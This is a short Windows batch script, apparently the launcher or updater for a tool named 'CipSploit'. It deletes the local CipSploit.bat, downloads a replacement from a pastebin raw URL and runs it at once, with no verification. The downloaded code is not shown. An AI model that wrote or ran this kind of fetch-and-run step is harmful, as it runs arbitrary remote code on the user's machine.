@echo off
cls
cd ..
cd ..
IF EXIST "CipSploit.bat" del "CipSploit.bat" 
download https://pastebin.com/raw/f0rFGadA "CipSploit.bat"
ping localhost -n 5 >nul
cls
IF EXIST "CipSploit.bat" call "CipSploit.bat"







